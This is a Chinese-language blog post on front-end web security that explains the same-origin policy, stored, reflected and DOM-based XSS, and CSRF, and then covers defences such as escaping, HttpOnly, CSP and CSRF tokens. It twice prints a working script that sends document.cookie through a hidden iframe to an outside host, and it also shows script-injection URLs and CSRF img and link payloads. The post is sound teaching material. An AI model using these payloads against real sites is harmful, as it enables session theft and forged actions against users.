---
layout: post
title: "web安全杂谈"
description: "主要针对web前端安全问题,如XSS,CSRF等"
date: 2018-03-19
tags: [front-end, security]
comments: true
share: true
---

网络已经是我们生活不可缺失的一部分了,在我们能接触到的大大小小的网络应用中其实隐藏了不少安全问题,因为安全问题是在很难考虑得面面俱到的,随着版本迭代更新,总会出发新的问题而又没有被发现的,大公司如此,小网站小论坛情况更是严峻.而在前端web应用上,经常要面临的安全问题无非两个,`XSS`和`CSRF`.

不过要说起web前端的安全问题,就不得不说下浏览器的同源策略,这个同源策略还与前端另一个老生常谈的问题`跨域请求`有着很大的联系.

## 浏览器的同源策略

> 同源策略限制了从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的重要安全机制。(来自 [MDN](https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy))

具体定义可以在[MDN文档](https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy)中查看,这里只做下简单介绍.

一个源的定义: 如果两个页面的协议，端口（如果有指定）和域名都相同，则两个页面具有相同的源。

下表给出了相对`http://store.company.com/dir/page.html`同源检测的示例:

| url | 结果 | 原因 |
| --- | --- | --- |
| `http://store.company.com/dir2/other.html` | 成功| |
| `http://store.company.com/dir/inner/another.html` | 成功 | |
| `https://store.company.com/secure.html` | 失败 | 不同协议 ( https和http ) |
| `http://store.company.com:81/dir/etc.html` | 失败 | 不同端口 ( 81和80) |
| `http://news.company.com/dir/other.html` | 失败 | 不同域名 ( news和store ) |

### 注意: 例外的IE

当涉及到同源策略时，Internet Explorer 有两个主要的不同点

- 授信范围（Trust Zones）：两个相互之间高度互信的域名，如公司域名（corporate domains），不遵守同源策略的限制。
- 端口：IE 未将端口号加入到同源策略的组成部分之中，因此 http://company.com:81/index.html 和http://company.com/index.html  属于同源并且不受任何限制。

这些例外是非标准的，其它浏览器也未做出支持，但会助于开发基于window RT IE的应用程序。

> 以上内容摘自[MDN](https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy)

## XSS

XSS,全称Cross Site Scripting(据说是为了和`css`保持区分所以才缩写为XSS),中文常译作跨站脚本攻击.一般表现为用户利用网络应用的漏洞,注入可执行代码,从而影响到其他打开被注入脚本网页的用户.

XSS攻击基本分为储存型,反射型以及基于DOM这几种情况.

### 储存型(Stored XSS)

储存型的XSS是最常见,而且也是最具破坏性的XSS攻击.思考以下场景.

有一个论坛网站,允许用户发表文章并在对应文章下进行评论,而有恶意的用户如在某热门文章下评论时注入了脚本,而网站又没有对其进行过滤或转移,将其作为一个正常的评论保存在了数据库中,那之后打开这篇文章的所有用户都将在无意中执行该恶意脚本.

这是储存型XSS一个典型的例子.而攻击的威胁性则取决于执行脚本的目的.小打小闹如注入的脚本诸如`alert('fool!')`之类的会影响用户体验.糟糕的可能会窃取用户信息而后进行更进一步的攻击.

```html
这是评论的内容,如果下面的内容没有被转义的话你是看不到的,因为会被浏览器识别为脚本并执行.
<script type="text/javascript">
  (function(window, document) {
      // 构造泄露信息用的 URL
      var cookies = document.cookie;
      var xssURIBase = "http://192.168.123.123/myxss/";
      var xssURI = xssURIBase + window.encodeURI(cookies);
      // 建立隐藏 iframe 用于通讯
      var hideFrame = document.createElement("iframe");
      hideFrame.height = 0;
      hideFrame.width = 0;
      hideFrame.style.display = "none";
      hideFrame.src = xssURI;
      // 开工
      document.body.appendChild(hideFrame);
  })(window, document);
</script>
<!-- 实例代码来自网上例子 -->
```

> 注意,上面用到了iframe来提交,是因为同源策略限制的缘故,而这种提交方式,也是后面要讲的CSRF的其中一种攻击模式.

这样用户的信息(cookie)已经被攻击者获取了.

### 反射型(Reflected XSS)

反射型XSS不会存储在数据库中,就范围而言可能不会达到存储型XSS那样广,反射型XSS表现为构造有问题的url,然后诱使其他用户打开该问题url,达到注入脚本的目的.一般会出现在服务端会根据query参数来渲染前端模板.

参考下面的例子

```html
<!-- url: http://mydomain.com/page?link=link&name=name -->
<!-- 伪造url: http://mydomain.com/page?link=link&name=you-are-fool</a><script>alert('xss')</script> -->

<!-- 一下模板语法仅为举例说明 -->
<!-- 后端模板 -->
<a href="{ link }">{ name }</a>
<!-- 渲染过后 -->
<a href="link">you-are-fool</a><script>alert('xss')</script></a>
```

这时打开该url则会出现弹窗.

### 基于DOM的XSS

在翻阅资料之后个人认为基于DOM的XSS攻击应该归属于反射型XSS下,因为一般表现形式都是在构造有问题的url,主要区别在于基于DOM的XSS主要应用DOM或是其他一些JS API来处理伪造url.而且在一定程度上是最难以防范的XSS攻击,因为攻击不经过服务端处理,而可能触发攻击的DOM解析又遍布在应用中,可能稍不留神就会出现遗漏情况.

参考下面的例子

```html
<!-- url: http://mydomain.com/page?link=link&name=name -->
<!-- 伪造url: http://mydomain.com/page?link=link&name=you-are-fool</a><script>alert('xss')</script> -->

<script>
  // 假设query方法是获取url中的query信息
  var link = getQuery()['link'];
  var name = getQuery()['name'];
  document.write("url: <a href='"+link+"'>"+name+"</a>");
</script>
```

表现行为和反射型XSS的例子是一样的.

### 怎么防范XSS

XSS攻击原理是比较清晰简单的,但在实际中却是难以防范.因为软件开发本就处于非常快的迭代过程中,B/C架构的web应用更是如此,应用复杂度本身在不断地提升,而在现实开发过程中,还会出现很多工作人手替换交接不清晰等情况,种种原因都可能让我们没能细致的检查好每一个可能出现XSS攻击的地方.总的来说手段还是有的,只是人容易出错.下面介绍几个防御XSS攻击的方法.

#### 设置cookie为HttpOnly

这个方法可以限制javascript读取cookie,严格中并不算防御了XSS,但降低了损失和未来可能引发的更为严重的攻击.

#### 处理用户输入

如果比较严格的情况下,可以完全禁止一些敏感词如`javascript`和`cookie`等,但显示中都不太可能做这种方面的限制,例如本身就是技术类论坛的话,这些敏感词本来就是常被提及到的概念.

再来是对用户的输入进行转义.例如对`<`, `>`, `"` ,`'` , `/`等字符转化成html字符实体后再显示在页面中,而如果是非富文本的内容还有一些快捷的过滤方式

```js
// 来自Stack Overflow
// 思路清晰好用,不过评论中好像有提到兼容性问题
function stripScripts(s) {
  var div = document.createElement('div');
  div.innerHTML = s;
  var scripts = div.getElementsByTagName('script');
  var i = scripts.length;
  while (i--) {
    scripts[i].parentNode.removeChild(scripts[i]);
  }
  return div.innerHTML;
}

alert(stripScripts('<span><script type="text/javascript">alert(\'foo\');<\/script><\/span>'));
```

#### 内容安全策略(CSP)

> 内容安全策略 (CSP, Content Security Policy) 是一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本 (XSS) 和数据注入等攻击。 这些攻击可用于实现从数据窃取到网站破坏或作为恶意软件分发版本等用途。

这里不展开讲CSP的具体概念,详情可以自行翻阅[MDN文旦](https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP)和[Can i use csp](https://caniuse.com/#search=csp).

简单来说即是提前设置好关于脚本或内容的信任关系即可,这样当遇到来源不属于信任列表中的的脚本或图片时,也不会去执行脚本或请求图片.而且CSP设计之初也有考虑到内联脚本的XSS攻击,也有相关的解决方案,详细用法和语法可以查看[MDN文档](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)

## CSRF

CSRF,全称Cross-site request forgery,跨站请求伪造.顾名思义就是从非本站的其他网站中伪造请求到本站.而且还是本站真实用户自己在不知情的情况下触发的请求.

### CSRF具体形式

简单表现为,用户伪造页面,而在页面中发起伪造请求攻击目标.

假设有一个论坛网站,当用户要删除一篇文章时请求url为`http://mydomain.com/post/delete/id`,我们就可以简单伪造一个页面,而网站中有一个a标签跳转`<a href="http://mydomain.com/post/delete/1">赢取现金大奖</a>`,在用户点击了该a标签进行跳转时,实际就完成了一次对攻击目标的请求(前提是用户在目标网站上的登录状态还没有过时),就在用户不知情的情况下删除了文章.或者在伪造页面中使用img标签`<img src="http://mydomain.com/post/delete/1">`,这样在用户打开伪造网站时攻击请求就已经发出了而无需其他操作.

> ps: 用img标签请求非本站资源,是跨域的一种形式

虽然上面的例子比较局限,前提是网站API使用了get方法来进行信息的进行更新或删除.对的,在防范CSRF的第一个建议就是遵守关于http method的规范,如`get`和`head`方法应该只用来获取资源,使用`post`和`put`和`delete`来进行数据的增改删.但是API使用post请求也时无法阻止CSRF的.

还记得XSS章节中使用的盗取cookie时用到的提交的方法吗?

```js
(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase = "http://192.168.123.123/myxss/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);
```

完全可以在伪造页面中进行类似的操作,例如在iframe中构造表单,然后诱使用户触发提交表单.

> pps: iframe也是跨域请求的一种模式.

### 如何防范CSRF

除了上面提到的首先要规范的定义接口之后(并不能防范CSRF),大多数CSRF的预防技术都是通过在验证请求的信息来区分是否来自可信任域的请求.

#### 请求头中的Referer头或Origin

服务端需要检查请求Referer或Origin字段,区分是否来自信任域的请求.但是这种方法并不安全可靠,首先Referer头的值是由浏览器添加的,但各浏览器厂商实现各不同,如果这样校验就等同于依赖第三方来保证安全性.其次要伪造Referer头并不是不可能,一些浏览器插件就可以自定义http头.

#### 在请求中添加token并验证

CSRF攻击可以成功的原因在于完全的伪造了用户的请求,也就是说该伪造请求完全通过了我们的用户信息验证,而对于只是用session/cookie来进行用户验证的网站来说,只要成功请求,那通过验证成本是很低的.

我们可以在http请求以参数的形式加入一个由服务端生成的token,然后在后端对这个token进行校验.而前端则需要在在每一个请求都加上这个token参数.由于token不存在cookie中,攻击者就算提前获取了cookie也没法模拟token.

缺点除了需要前端再每个请求都添加上token参数外,还难以保证token自身的可靠.个人认为加强token的生成和校验规则可以一定程度解决这个问题.

#### 在http头中加入token

原理同上,只是这次并不是增加请求的参数数据,而是新增自定义请求头.不过这种做法只适用于Ajax异步提交,局限性较大.当然对于SPA来说的话反而是更好的方案.

#### SameSite cookie

这里不额外讨论,因为只有较新版本的chrome和firefox支持,具体使用可以查阅[资料](https://www.owasp.org/index.php/SameSite).

## 后记

之前对相关问题都是一知半解,每次都是遇到了问题再去找解决方案,好记性不如烂笔头,这次总结权当为了记录,如发现有错漏请大方联系,我必虚心受教.安全不易,且行且珍惜.
